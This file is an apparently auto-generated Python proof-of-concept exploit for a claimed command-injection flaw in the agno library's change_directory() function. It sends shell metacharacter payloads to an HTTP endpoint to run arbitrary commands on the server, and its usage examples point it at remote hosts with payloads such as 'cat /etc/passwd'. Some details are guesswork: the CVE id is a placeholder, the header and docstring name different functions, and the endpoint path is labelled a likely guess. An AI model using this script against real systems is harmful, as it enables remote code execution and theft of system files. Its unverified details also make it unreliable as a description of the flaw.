#!/usr/bin/env python3
# PoC for agno (/tmp/agno/libs/agno)
# Path: rce-020
# Sink: run_shell_command
# Auto-generated — run with: python3 rce_run_shell_command_function_run_shell_command_3.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for agno RCE vulnerability (CVE-2024-XXXXX).

Vulnerability: Command injection in change_directory() function.
The 'directory' parameter is passed unsanitized into an f-string that is
executed via subprocess.run() with shell=True, allowing arbitrary shell commands.

Impact: Remote Code Execution (RCE) as the user running the agno service.
"""

import argparse
import json
import sys
import urllib.request
import urllib.error
import urllib.parse

# Default target - change as needed
DEFAULT_TARGET = "http://localhost:8000"
# Benign payload to confirm RCE - creates a marker file
BENIGN_PAYLOAD = "touch /tmp/poc_success.txt"
# Timeout for HTTP requests
TIMEOUT = 10


def send_exploit(target_url: str, payload: str) -> bool:
    """
    Send the exploit payload to the vulnerable endpoint.
    
    The vulnerability is in the change_directory() function which takes a
    'directory' parameter and passes it directly into a shell command.
    We inject our payload using shell metacharacters.
    
    Args:
        target_url: Base URL of the agno service
        payload: Shell command to execute
        
    Returns:
        True if exploit appears successful, False otherwise
    """
    # Construct the malicious directory parameter
    # The original command is: cd {directory}
    # We inject: ; <payload> ; echo done
    # This executes our payload after the cd command
    malicious_dir = f"; {payload} ; echo done"
    
    # URL encode the payload
    encoded_dir = urllib.parse.quote(malicious_dir, safe='')
    
    # Construct the full URL - adjust endpoint path as needed
    # Based on the code, this is likely a POST to an API endpoint
    exploit_url = f"{target_url}/api/change_directory?directory={encoded_dir}"
    
    print(f"[*] Sending exploit to: {exploit_url}")
    print(f"[*] Payload: {payload}")
    
    try:
        # Send the request
        req = urllib.request.Request(exploit_url, method='POST')
        with urllib.request.urlopen(req, timeout=TIMEOUT) as response:
            response_data = response.read().decode('utf-8')
            print(f"[*] Response status: {response.status}")
            print(f"[*] Response body: {response_data[:500]}...")
            
            # Check if we got a successful response
            if response.status == 200:
                print("[+] Exploit request sent successfully")
                return True
            else:
                print(f"[-] Unexpected status code: {response.status}")
                return False
                
    except urllib.error.HTTPError as e:
        print(f"[-] HTTP Error: {e.code} - {e.reason}")
        print(f"[-] Response: {e.read().decode('utf-8')[:500]}")
        return False
    except urllib.error.URLError as e:
        print(f"[-] URL Error: {e.reason}")
        return False
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        return False


def verify_exploit(target_url: str) -> bool:
    """
    Verify if the exploit was successful by checking if the marker file exists.
    
    This uses a second request to check if our payload executed.
    We can use another vulnerable endpoint or a different technique.
    
    Args:
        target_url: Base URL of the agno service
        
    Returns:
        True if marker file exists (exploit worked), False otherwise
    """
    # Try to read the marker file using another command injection
    # or check via a different endpoint
    verify_payload = "cat /tmp/poc_success.txt 2>/dev/null || echo 'NOT_FOUND'"
    malicious_dir = f"; {verify_payload} ; echo done"
    encoded_dir = urllib.parse.quote(malicious_dir, safe='')
    
    verify_url = f"{target_url}/api/change_directory?directory={encoded_dir}"
    
    try:
        req = urllib.request.Request(verify_url, method='POST')
        with urllib.request.urlopen(req, timeout=TIMEOUT) as response:
            response_data = response.read().decode('utf-8')
            
            # Check if the marker file content is in the response
            if "poc_success" in response_data:
                print("[+] Exploit verified! Marker file exists.")
                return True
            else:
                print("[-] Could not verify exploit - marker file not found")
                return False
                
    except Exception as e:
        print(f"[-] Verification failed: {e}")
        return False


def main():
    """Main function to run the exploit."""
    parser = argparse.ArgumentParser(
        description="PoC exploit for agno RCE vulnerability",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --target http://localhost:8000
  %(prog)s --target http://192.168.1.100:8080 --payload "id"
  %(prog)s --target https://example.com --payload "cat /etc/passwd" --no-verify
        """
    )
    
    parser.add_argument(
        "-t", "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    
    parser.add_argument(
        "-p", "--payload",
        default=BENIGN_PAYLOAD,
        help="Shell command to execute (default: touch /tmp/poc_success.txt)"
    )
    
    parser.add_argument(
        "--no-verify",
        action="store_true",
        help="Skip verification step"
    )
    
    args = parser.parse_args()
    
    print("[*] agno RCE Exploit PoC")
    print(f"[*] Target: {args.target}")
    print(f"[*] Payload: {args.payload}")
    print()
    
    # Step 1: Send the exploit
    print("[*] Step 1: Sending exploit payload...")
    success = send_exploit(args.target, args.payload)
    
    if not success:
        print("[-] Exploit failed to send")
        sys.exit(1)
    
    print()
    
    # Step 2: Verify if requested
    if not args.no_verify:
        print("[*] Step 2: Verifying exploit success...")
        verified = verify_exploit(args.target)
        
        if verified:
            print("[+] Exploit successful! RCE confirmed.")
        else:
            print("[-] Could not verify exploit. Check target manually.")
    else:
        print("[*] Verification skipped (--no-verify)")
        print("[*] Check manually if the payload executed")
    
    print()
    print("[*] Exploit completed.")


if __name__ == "__main__":
    main()
